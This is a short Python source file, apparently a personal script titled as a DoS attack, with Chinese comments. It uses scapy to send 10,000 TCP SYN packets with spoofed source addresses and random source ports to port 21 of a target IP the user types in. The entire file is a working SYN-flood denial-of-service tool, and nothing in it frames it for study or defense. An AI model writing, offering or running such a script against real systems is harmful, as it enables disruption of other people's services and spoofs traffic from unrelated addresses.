# -*- coding: utf-8 -*-
# @Time    : 2021/5/28 18:41
# @Author  : lvzhimeng
# @FileName: dos攻击.py
# @Software: PyCharm
from scapy.all import *
import random

from scapy.layers.inet import IP, TCP

dst_ip = input("请输入你要攻击目标的ip:")
for i in range(1,10000):     #攻击1w次
	random_ip = "1.1.1." + str(random.randrange(1,254))    #随机ip在1.1.1.1-254内
	random_Sport = random.randrange(49151,65535)     #端口在49151-65535内
	ip = IP(src = random_ip,dst = dst_ip)
	packet = TCP(sport = random_Sport,dport = 21,flags = 's',seq = 1111111)
	synpacker = (ip/packet)   #打包一下
	send(synpacker)